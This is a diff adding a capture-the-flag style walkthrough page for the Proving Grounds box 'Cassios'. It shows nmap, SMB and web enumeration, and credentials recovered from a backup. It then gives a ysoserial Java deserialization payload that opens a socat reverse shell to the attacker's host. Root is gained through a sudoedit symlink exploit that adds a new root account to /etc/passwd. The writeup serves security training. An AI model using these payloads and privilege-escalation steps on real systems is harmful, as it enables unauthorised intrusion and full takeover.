@@ -1,0 +1,468 @@
+---
+layout: default
+---
+<html>
+<head>
+    <title>Cassios Walkthrough</title>
+    <a href="https://pusher91.github.io/Hacking/">Return to Main Page</a>
+</head>
+
+<body>
+
+    <h1>Cassios Walkthrough</h1>
+
+    <hr>
+
+    <h2>Contents</h2>
+    <ul>
+        <li><a href="#summary">Summary</a></li>
+        <li><a href="#portscan">Port Scanning</a></li>
+        <li><a href="#infogather">Information Gathering</a></li>
+        <li><a href="#samantha">Shell - samantha</a></li>
+        <li><a href="#root">Shell - root</a></li>
+    </ul>
+
+    <h2><a id="summary">Summary</a></h2>
+
+    <p>Cassios is a relatively straightforward box.  It involves web enumeration and then exploiting java deserialization to obtain a reverse shell.  Privesc to root involved exploiting a sudo ability that is uniquely exploitable for the sudo version installed on the box.</p>
+
+    <h2><a id="portscan">Port Scanning</a></h2>
+
+    <li>We start off by running an nmap scan against all ports.</li>
+
+    <pre>
+&#x250c;&#x2500;&#x2500;(kali&#x327f;kali)-[~/Documents/ProvingGrounds/Cassios]
+&#x2514;&#x2500;$ sudo nmap -p- 192.168.181.116 -oN nmap/ping_tcp                      
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-14 20:33 EDT
+Nmap scan report for 192.168.181.116
+Host is up (0.047s latency).
+Not shown: 65530 closed ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+8080/tcp open  http-proxy
+
+Nmap done: 1 IP address (1 host up) scanned in 33.57 seconds    
+    </pre>
+
+    <li>We run another nmap scan.  This time we only target the open ports.  We also use the flags -sV and -sC to enumerate service versions and other information by using nmap scripts.</li>
+
+    <pre>
+&#x250c;&#x2500;&#x2500;(kali&#x327f;kali)-[~/Documents/ProvingGrounds/Cassios/nmap]
+&#x2514;&#x2500;$ sudo nmap -p22,80,139,445,8080 -sV -sC 192.168.181.116 -oN script_tcp
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-14 20:35 EDT
+Nmap scan report for 192.168.181.116
+Host is up (0.038s latency).
+
+PORT     STATE SERVICE     VERSION
+22/tcp   open  ssh         OpenSSH 7.4 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 36:cd:06:f8:11:72:6b:29:d8:d8:86:99:00:6b:1d:3a (RSA)
+|   256 7d:12:27:de:dd:4e:8e:88:48:ef:e3:e0:b2:13:42:a1 (ECDSA)
+|_  256 c4:db:d3:61:af:85:95:0e:59:77:c5:9e:07:0b:2f:74 (ED25519)
+80/tcp   open  http        Apache httpd 2.4.6 ((CentOS))
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Apache/2.4.6 (CentOS)
+|_http-title: Landed by HTML5 UP
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: SAMBA)
+445/tcp  open  netbios-ssn Samba smbd 4.10.4 (workgroup: SAMBA)
+8080/tcp open  http-proxy
+| fingerprint-strings: 
+|   GetRequest: 
+|     HTTP/1.1 200 
+|     X-Content-Type-Options: nosniff
+|     X-XSS-Protection: 1; mode=block
+|     Cache-Control: no-cache, no-store, max-age=0, must-revalidate
+|     Pragma: no-cache
+|     Expires: 0
+|     X-Frame-Options: DENY
+|     Content-Type: text/html;charset=UTF-8
+|     Content-Language: en-US
+|     Date: Wed, 15 Sep 2021 00:35:37 GMT
+|     Connection: close
+|     &lt;!doctype html&gt;
+|     &lt;html lang=&quot;en&quot;&gt;
+|     &lt;head&gt;
+|     &lt;meta charset=&quot;utf-8&quot;&gt;
+|     &lt;meta http-equiv=&quot;x-ua-compatible&quot; content=&quot;ie=edge&quot;&gt;
+|     &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;
+|     &lt;title&gt;&lt;/title&gt;
+|     &lt;link rel=&quot;stylesheet&quot; href=&quot;/css/main.css&quot;&gt;
+|     &lt;/head&gt;
+|     &lt;body&gt;
+|     &lt;div class=&quot;small-container&quot;&gt;
+|     &lt;div class=&quot;flex-row&quot;&gt;
+|     &lt;h1&gt;Recycler Management System&lt;/h1&gt;
+|     &lt;/div&gt;
+|     &lt;div class=&quot;flex-row&quot;&gt;
+|     &lt;img src=&quot;/images/factory.jpg&quot; class=&quot;round-button&quot;&gt;
+|     &lt;/div&gt; 
+|     &lt;/div&gt;
+|     &lt;br&gt;
+|     &lt;div class=&quot;small-container&quot;&gt;
+|     &lt;div class=&quot;flex-small&quot;&gt;Control system for the factory
+|   HTTPOptions: 
+|     HTTP/1.1 200 
+|     Allow: GET,HEAD,OPTIONS
+|     X-Content-Type-Options: nosniff
+|     X-XSS-Protection: 1; mode=block
+|     Cache-Control: no-cache, no-store, max-age=0, must-revalidate
+|     Pragma: no-cache
+|     Expires: 0
+|     X-Frame-Options: DENY
+|     Content-Length: 0
+|     Date: Wed, 15 Sep 2021 00:35:37 GMT
+|     Connection: close
+|   RTSPRequest: 
+|     HTTP/1.1 400 
+|     Content-Type: text/html;charset=utf-8
+|     Content-Language: en
+|     Content-Length: 435
+|     Date: Wed, 15 Sep 2021 00:35:37 GMT
+|     Connection: close
+|     &lt;!doctype html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;&lt;title&gt;HTTP Status 400 
+|     Request&lt;/title&gt;&lt;style type=&quot;text/css&quot;&gt;body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP Status 400 
+|_    Request&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;
+|_http-open-proxy: Proxy might be redirecting requests
+|_http-title: Site doesn&#039;t have a title (text/html;charset=UTF-8).
+|_http-trane-info: Problem with XML parsing of /evox/about
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port8080-TCP:V=7.91%I=7%D=9/14%Time=61413FD8%P=x86_64-pc-linux-gnu%r(Ge
+SF:tRequest,429,&quot;HTTP/1\.1\x20200\x20\r\nX-Content-Type-Options:\x20nosnif
+SF:f\r\nX-XSS-Protection:\x201;\x20mode=block\r\nCache-Control:\x20no-cach
+SF:e,\x20no-store,\x20max-age=0,\x20must-revalidate\r\nPragma:\x20no-cache
+SF:\r\nExpires:\x200\r\nX-Frame-Options:\x20DENY\r\nContent-Type:\x20text/
+SF:html;charset=UTF-8\r\nContent-Language:\x20en-US\r\nDate:\x20Wed,\x2015
+SF:\x20Sep\x202021\x2000:35:37\x20GMT\r\nConnection:\x20close\r\n\r\n&lt;!doc
+SF:type\x20html&gt;\n&lt;html\x20lang=\&quot;en\&quot;&gt;\n\n&lt;head&gt;\n\x20\x20&lt;meta\x20charse
+SF:t=\&quot;utf-8\&quot;&gt;\n\x20\x20&lt;meta\x20http-equiv=\&quot;x-ua-compatible\&quot;\x20conten
+SF:t=\&quot;ie=edge\&quot;&gt;\n\x20\x20&lt;meta\x20name=\&quot;viewport\&quot;\x20content=\&quot;width=d
+SF:evice-width,\x20initial-scale=1\&quot;&gt;\n\n\x20\x20&lt;title&gt;&lt;/title&gt;\n\n\x20\x
+SF:20&lt;link\x20rel=\&quot;stylesheet\&quot;\x20href=\&quot;/css/main\.css\&quot;&gt;\n\x20\x20\n&lt;/
+SF:head&gt;\n\n&lt;body&gt;\n\t\n\t&lt;div\x20class=\&quot;small-container\&quot;&gt;\n\t\t&lt;div\x20
+SF:class=\&quot;flex-row\&quot;&gt;\n\t\t\t&lt;h1&gt;Recycler\x20Management\x20System&lt;/h1&gt;\n\
+SF:t\t&lt;/div&gt;\n\t\t&lt;div\x20class=\&quot;flex-row\&quot;&gt;\n\t\t\t&lt;img\x20src=\&quot;/images
+SF:/factory\.jpg\&quot;\x20class=\&quot;round-button\&quot;&gt;\n\t\t&lt;/div&gt;\x20\n\n\t&lt;/div&gt;\
+SF:n\t&lt;br&gt;\n\t&lt;div\x20class=\&quot;small-container\&quot;&gt;\n\n\t\t\t&lt;div\x20class=\&quot;
+SF:flex-small\&quot;&gt;Control\x20system\x20for\x20the\x20factory\x20&quot;)%r(HTTPOpt
+SF:ions,12B,&quot;HTTP/1\.1\x20200\x20\r\nAllow:\x20GET,HEAD,OPTIONS\r\nX-Conte
+SF:nt-Type-Options:\x20nosniff\r\nX-XSS-Protection:\x201;\x20mode=block\r\
+SF:nCache-Control:\x20no-cache,\x20no-store,\x20max-age=0,\x20must-revalid
+SF:ate\r\nPragma:\x20no-cache\r\nExpires:\x200\r\nX-Frame-Options:\x20DENY
+SF:\r\nContent-Length:\x200\r\nDate:\x20Wed,\x2015\x20Sep\x202021\x2000:35
+SF::37\x20GMT\r\nConnection:\x20close\r\n\r\n&quot;)%r(RTSPRequest,24E,&quot;HTTP/1\
+SF:.1\x20400\x20\r\nContent-Type:\x20text/html;charset=utf-8\r\nContent-La
+SF:nguage:\x20en\r\nContent-Length:\x20435\r\nDate:\x20Wed,\x2015\x20Sep\x
+SF:202021\x2000:35:37\x20GMT\r\nConnection:\x20close\r\n\r\n&lt;!doctype\x20h
+SF:tml&gt;&lt;html\x20lang=\&quot;en\&quot;&gt;&lt;head&gt;&lt;title&gt;HTTP\x20Status\x20400\x20\xe2\x80
+SF:\x93\x20Bad\x20Request&lt;/title&gt;&lt;style\x20type=\&quot;text/css\&quot;&gt;body\x20{font
+SF:-family:Tahoma,Arial,sans-serif;}\x20h1,\x20h2,\x20h3,\x20b\x20{color:w
+SF:hite;background-color:#525D76;}\x20h1\x20{font-size:22px;}\x20h2\x20{fo
+SF:nt-size:16px;}\x20h3\x20{font-size:14px;}\x20p\x20{font-size:12px;}\x20
+SF:a\x20{color:black;}\x20\.line\x20{height:1px;background-color:#525D76;b
+SF:order:none;}&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP\x20Status\x20400\x20\xe2\x80\
+SF:x93\x20Bad\x20Request&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;&quot;);
+Service Info: Host: CASSIOS
+
+Host script results:
+|_clock-skew: mean: 1h20m01s, deviation: 2h18m35s, median: 0s
+| smb-os-discovery: 
+|   OS: Windows 6.1 (Samba 4.10.4)
+|   Computer name: cassios
+|   NetBIOS computer name: CASSIOS\x00
+|   Domain name: \x00
+|   FQDN: cassios
+|_  System time: 2021-09-14T20:35:46-04:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2021-09-15T00:35:44
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 27.50 seconds
+    </pre>
+
+    <h2><a id="infogather">Information Gathering</a></h2>
+
+    <li>We start off by taking a look at smb.  By using smbmap we are able to quickly see what shares exist and what permissions we have on those shares, while using an anonymous login.</li>
+
+    <pre>
+&#x250c;&#x2500;&#x2500;(kali&#x327f;kali)-[~/&hellip;/ProvingGrounds/Cassios/exfiltrated/SMB]
+&#x2514;&#x2500;$ smbmap -H 192.168.231.116        
+[+] IP: 192.168.231.116:445 Name: 192.168.231.116                                   
+        Disk                                                    Permissions Comment
+    ----                                                    ----------- -------
+    print$                                              NO ACCESS   Printer Drivers
+    Samantha Konstan                                    READ, WRITE Backups and Recycler files
+    IPC$                                                NO ACCESS   IPC Service (Samba 4.10.4)
+    </pre>
+
+    <li>It appears we have both read and write access to the share "Samantha Konstan".  I use smbmap to recursively download all the contents of this share. </li>
+
+    <pre>
+┌──(kali㉿kali)-[~/…/ProvingGrounds/Cassios/exfiltrated/SMB]
+└─$ smbmap -H 192.168.181.116 -R -A .
+[+] IP: 192.168.181.116:445 Name: 192.168.181.116                                   
+[+] Starting search for files matching '.' on share Samantha Konstan.
+[+] Match found! Downloading: Samantha Konstan\recycler.ser
+[+] Match found! Downloading: Samantha Konstan\readme.txt
+[+] Match found! Downloading: Samantha Konstan\resources.html
+[+] Match found! Downloading: Samantha Konstan\pom-bak.xml
+[+] Match found! Downloading: Samantha Konstan\spring-mvc-quickstart-archetype\README.md
+[+] Match found! Downloading: Samantha Konstan\spring-mvc-quickstart-archetype\archetype-catalog.xml
+[+] Match found! Downloading: Samantha Konstan\spring-mvc-quickstart-archetype\pom.xml
+[+] Match found! Downloading: Samantha Konstan\spring-mvc-quickstart-archetype\src\main\resources\archetype-resources\.gitignore
+[+] Match found! Downloading: Samantha Konstan\spring-mvc-quickstart-archetype\src\main\resources\archetype-resources\pom.xml
+[+] Match found! Downloading: Samantha Konstan\thymeleafexamples-layouts\BUILD.txt
+[+] Match found! Downloading: Samantha Konstan\thymeleafexamples-layouts\CONTRIBUTING.markdown
+[+] Match found! Downloading: Samantha Konstan\thymeleafexamples-layouts\LICENSE.txt
+[+] Match found! Downloading: Samantha Konstan\thymeleafexamples-layouts\NOTICE.txt
+[+] Match found! Downloading: Samantha Konstan\thymeleafexamples-layouts\README.md
+[+] Match found! Downloading: Samantha Konstan\thymeleafexamples-layouts\pom.xml
+[+] Match found! Downloading: Samantha Konstan\thymeleafexamples-layouts\src\assembly\sources.xml
+[+] Match found! Downloading: Samantha Konstan\thymeleafexamples-layouts\src\main\resources\application.properties
+[+] Match found! Downloading: Samantha Konstan\thymeleafexamples-layouts\src\main\resources\logback.xml
+[+] Match found! Downloading: Samantha Konstan\thymeleafexamples-layouts\src\main\resources\persistence.properties
+[+] Match found! Downloading: Samantha Konstan\thymeleafexamples-layouts\src\main\webapp\WEB-INF\web.xml
+    </pre>
+
+    <li>I take a look through the share to see if I can find anything interesting.  One thing I always like to do is recursively search for the phrase "pass" and "password".  This search turns up nothing.</li>
+
+    <pre>
+&#x250c;&#x2500;&#x2500;(kali&#x327f;kali)-[~/&hellip;/ProvingGrounds/Cassios/exfiltrated/SMB]
+&#x2514;&#x2500;$ grep -irn pass
+192.168.181.116-Samantha Konstan_spring-mvc-quickstart-archetype_README.md:139:dataSource.password=postgres
+192.168.181.116-Samantha Konstan_thymeleafexamples-layouts_src_main_resources_persistence.properties:4:dataSource.password=
+192.168.181.116-Samantha Konstan_resources.html:359:returns file system locations for a passed-in empty string (indicating
+    </pre>
+
+    <li>I do find a readme.txt file which looks interestering.  We will want to take note of this and remember it for later.</li>
+
+    <pre>
+&#x250c;&#x2500;&#x2500;(kali&#x327f;kali)-[~/&hellip;/ProvingGrounds/Cassios/exfiltrated/SMB]
+&#x2514;&#x2500;$ cat 192.168.181.116-Samantha\ Konstan_readme.txt 
+The recycler is a critical piece of our industrial infraestructure.
+Please be careful with it!
+
+The .ser file holds all the last data saved from the process, it can
+be readed from the upper management dashboard app. 
+
+Remember to set the location of the file to my home directory &quot;~/backups&quot;.
+
+Set this directory to share access so the remote system can access the
+file via SMB.
+
+Any concerns or suggestions, please reach at samantha@loca.host.
+
+Samantha Konstan
+Java Mantainer
+    </pre>
+
+    <br>
+
+    <li>Now I move to port 80.</li>
+
+    <img src="../images/cassios/port80.png">
+
+    <br>
+    <br>
+
+    <li>I start off with a gobuster search on port 80 to see which directories exist.  I first ran this scan with directory-list-2.3-medium.txt but that list missed the directory /backup_migrate.</li>
+
+    <pre>
+&#x250c;&#x2500;&#x2500;(kali&#x327f;kali)-[~/Documents/ProvingGrounds/Cassios]
+&#x2514;&#x2500;$ cat 192.168.181.116-raft | grep -v 403
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.181.116/
+[+] Method:                  GET
+[+] Threads:                 100
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Timeout:                 10s
+===============================================================
+2021/09/14 15:30:09 Starting gobuster in directory enumeration mode
+===============================================================
+/assets               (Status: 301) [Size: 238] [--&gt; http://192.168.181.116/assets/]
+/.                    (Status: 200) [Size: 9088]                                    
+/images               (Status: 301) [Size: 238] [--&gt; http://192.168.181.116/images/]
+/download             (Status: 200) [Size: 1479862]                                 
+/backup_migrate       (Status: 301) [Size: 246] [--&gt; http://192.168.181.116/backup_migrate/]
+===============================================================
+2021/09/14 15:30:36 Finished
+===============================================================
+    </pre>
+
+    <li>I visit the /download directory and it turns out to be a download link for the file "download".  This file turns out to be a zip file.  Upon unzipping this file and looking through the contents nothing interesting stands out.</li>
+
+    <pre>
+&#x2500;&#x2500;(kali&#x327f;kali)-[~/Documents/ProvingGrounds/Cassios/exfiltrated]
+&#x2514;&#x2500;$ file download 
+download: Zip archive data, at least v2.0 to extract
+    </pre>
+
+    <li>The backup_migrate web directory reveals a file to download named "recycler.tar".  I download this file and extract the contents using "tar -xvf recycler.tar".  Recursively searching the extracted files reveals the password "DoNotMessWithTheRecycler123".  At this point I look through the file that contains the password and it also reveals the username "recycler" to go along with it. </li>
+
+    <pre>                                                                                                                                                          
+&#x250c;&#x2500;&#x2500;(kali&#x327f;kali)-[~/&hellip;/ProvingGrounds/Cassios/exfiltrated/src]
+&#x2514;&#x2500;$ grep -irn password
+main/java/com/industrial/recycler/WebSecurityConfig.java:35:             User.withDefaultPasswordEncoder()
+main/java/com/industrial/recycler/WebSecurityConfig.java:37:                .<mark>password(&quot;DoNotMessWithTheRecycler123&quot;)</mark>
+main/resources/templates/login.html:23:             Invalid username and password.
+main/resources/templates/login.html:32:           &lt;label for=&quot;name&quot;&gt;Password:&lt;/label&gt;
+main/resources/templates/login.html:33:           &lt;input type=&quot;password&quot;  name=&quot;password&quot;  id=&quot;password&quot; placeholder=&quot;Ask to your supervisor&quot;&gt;
+main/resources/static/css/main.css:871:[type=color], [type=date], [type=datetime], [type=datetime-local], [type=email], [type=month], [type=number], [type=password], [type=search], [type=tel], [type=text], [type=url], [type=week], [type=time], select, textarea {
+main/resources/static/css/main.css:885:[type=color]:hover, [type=date]:hover, [type=datetime]:hover, [type=datetime-local]:hover, [type=email]:hover, [type=month]:hover, [type=number]:hover, [type=password]:hover, [type=search]:hover, [type=tel]:hover, [type=text]:hover, [type=url]:hover, [type=week]:hover, [type=time]:hover, select:hover, textarea:hover {
+main/resources/static/css/main.css:889:[type=color]:focus, [type=color]:active, [type=date]:focus, [type=date]:active, [type=datetime]:focus, [type=datetime]:active, [type=datetime-local]:focus, [type=datetime-local]:active, [type=email]:focus, [type=email]:active, [type=month]:focus, [type=month]:active, [type=number]:focus, [type=number]:active, [type=password]:focus, [type=password]:active, [type=search]:focus, [type=search]:active, [type=tel]:focus, [type=tel]:active, [type=text]:focus, [type=text]:active, [type=url]:focus, [type=url]:active, [type=week]:focus, [type=week]:active, [type=time]:focus, [type=time]:active, select:focus, select:active, textarea:focus, textarea:active {
+    </pre>
+
+    <li>main/java/com/industrial/recycler/WebSecurityConfig.java </li>
+
+    <pre>
+             User.withDefaultPasswordEncoder()
+                .username(&quot;recycler&quot;)
+                .password(&quot;DoNotMessWithTheRecycler123&quot;)
+                .roles(&quot;USER&quot;)
+                .build();
+    </pre>
+
+    <li>Now we take a look at port 8080</li>
+
+    <img src="../images/cassios/port8080.png">
+
+    <br>
+    <br>
+
+    <li>On the main page we see a link for the dashboard.  On that next page we see a login screen.  This looks like where we would use the credentials that we found.  We login successfully with username: recycler and password: DoNotMessWithTheRecycler123.  After logging in we are presented with this page.</li>
+
+    <img src="../images/cassios/port8080_loggedin.png">
+
+    <br>
+    <br>
+
+    <h2><a id="samantha">Shell - Samantha</a></h2>
+
+    <li>At this point we would refer back to the readme.txt we found in the SMB share.  There are a some key things to take away from the readme.</li>
+
+    <ul>
+        <li>The dashboard app being referred to is likely the dashboard we are seeing on :8080/dashboard.</li>
+        <li>The .ser file holds all the last data saved from the process</li>
+        <li>Data saved in the dashboard app will be saved to a .ser file.</li>
+        <li>The .ser file can be read by the dashboard app.</li>
+        <li>The .ser file will be saved to the SMB share.</li>
+        <li>The directory of the SMB share is ~/backups.  Samantha is writing this, so this is likely /home/samantha/backups.</li>
+    </ul>
+
+    <li>With this knowledge in mind, we click "Save Current Values".  Then we go to Samantha's SMB share and we find the a newly generate .ser file called recycler.ser.  When we click on "Check Status" we notice that the values remain the on the dashboard app.  This suggests we are able to create the .ser file by clicking "Save" and we are able to read the recycler.ser file from the SMB share using the Dashboard web app.  If we are able to modify the recycler.ser file then we might have remote code execution by having the dashboard app read the recycler.ser file.  According to our smbmap results from earlier we already know we have ready and write access to this SMB share.</li>
+
+    <br>
+
+    <li>In order to modify recycler.ser to gain a reverse shell, we need to know what kind of file we are working with.  We will do this using the "file" command.</li>
+
+    <pre>
+┌──(kali㉿kali)-[~/Documents/ProvingGrounds/Cassios]
+└─$ file recycler.ser 
+recycler.ser: Java serialization data, version 5
+    </pre>
+
+    <li>It appears to be a Java serialization file.  Which would lead to me to believe we are looking at a Java deserialization reverse shell.  We will use ysoserial to create the malicious recycler.ser file.  Go to https://github.com/frohoff/ysoserial and scroll down the the Installation section where you will find a download link for ysoserial-master-SNAPSHOT.jar.  This is the file we will use.</li>
+
+    <br>
+
+    <li>Before we can use ysoserial to generate the malicious file, we need to know exactly which type of payload to generate.  We need to gather more information which is located in the SMB.  The file pom-bak.xml contains the line &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt; which tells us to use commons-collections4 as the payload.  Now we are ready to generate our malicious recycler.ser file.</li>
+
+    <br>
+
+    <li>I tried a bunch of different methods to achieve a reverse shell.  This particular machine turns out to have socat on it.  So using socat was the easiest method of obtaining a reverse shell.</li>
+
+    <br>
+
+    <li>Generating the malicious recycler.ser file.</li>
+
+    <pre>
+┌──(kali㉿kali)-[~/Documents/ProvingGrounds/Cassios]
+└─$ java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "socat tcp-connect:192.168.49.231:80 exec:/bin/sh,pty,stderr,setsid,sigint,sane" > recycler.ser
+    </pre>
+
+    <li>Setting up my socat listener on port 80</li>
+
+    <pre>
+┌──(kali㉿kali)-[~/…/ProvingGrounds/Cassio/exfiltrated/SMB]
+└─$ socat file:`tty`,raw,echo=0 tcp-listen:80
+    </pre>
+
+    <li>Now we need to upload our malicious recycler.ser to the SMB share.  Then go to the dashboard app.  Click on "Check Status" to read the recycler.ser file from the SMB share.  We should have a reverse shell now.</li>
+
+    <pre>
+&#x250c;&#x2500;&#x2500;(kali&#x327f;kali)-[~/&hellip;/ProvingGrounds/Cassios/exfiltrated/SMB]
+&#x2514;&#x2500;$ socat file:`tty`,raw,echo=0 tcp-listen:80
+sh-4.2$ id
+uid=1000(samantha) gid=1000(samantha) groups=1000(samantha)
+sh-4.2$ python -c &quot;import pty;pty.spawn(&#039;/bin/bash&#039;);&quot;
+[samantha@cassios /]$ export TERM=xterm
+    </pre>
+
+    <li>The first thing I do is check sudo -l.  I find out that I have a sudo ability as Samantha.  I was not able to find a way to exploit this so I end up running linpeas.sh.  After running linpeas I find that the sudo version is 1.8.14.  Searchsploit turns up an exploit for this sudo version which directly relates to the sudo ability we have as Samantha on this machine.</li>
+
+    <pre>
+[samantha@cassios /]$ sudo -l
+Matching Defaults entries for samantha on cassios:
+    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="QTDIR
+    KDEDIR"
+
+User samantha may run the following commands on cassios:
+    (root) NOPASSWD: sudoedit /home/*/*/recycler.ser
+    </pre>
+
+    <li>Searchsploit results for sudo version 1.8.14</li>
+    
+    <pre>
+&#x250c;&#x2500;&#x2500;(kali&#x327f;kali)-[~/Documents/ProvingGrounds/Cassios]
+&#x2514;&#x2500;$ searchsploit sudo 1.8.14                                                      
+----------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                     |  Path
+----------------------------------------------------------------------------------- ---------------------------------
+Sudo 1.8.14 (RHEL 5/6/7 / Ubuntu) - &#039;Sudoedit&#039; Unauthorized Privilege Escalation   | linux/local/37710.txt
+----------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+    </pre>
+
+    <li>The exploit says that if we create a symbolic link file to the location of where our sudo ability "sudoedit" points to then we can get sudo rights to edit any file we choose.  I choose to edit /etc/passwd so I can add another root user.</li>
+
+    <br>
+
+    <h2><a id="root">Privesc - Root</a></h2>
+
+    <li>Creating symbolic link file</li>
+
+    <pre>
+[samantha@cassios backups]$ pwd&#13;&#10;/home/samantha/backups&#13;&#10;[samantha@cassios backups]$ ln -s /etc/passwd recycler.ser
+    </pre>
+
+    <li>Running sudo command to edit /etc/passwd</li>
+
+    <pre>
+[samantha@cassios backups]$ sudoedit -u root /home/*/*/recycler.ser
+    </pre>
+
+    <li>Towards the bottom of /etc/passwd I add the line "root2:S3g6q5KuTzNkU:0:0:root:/root:/bin/bash".  This creates a new root user named root2 with the password set to be "root".  Save the file.  Now we can use "su root2" and login with the password "root" and we have a root shell.</li>
+
+    <pre>
+[samantha@cassios backups]$ su root2&#13;&#10;Password: &#13;&#10;[root@cassios backups]# id&#13;&#10;uid=0(root) gid=0(root) groups=0(root)
+    </pre>
+
+</body>
+</html>
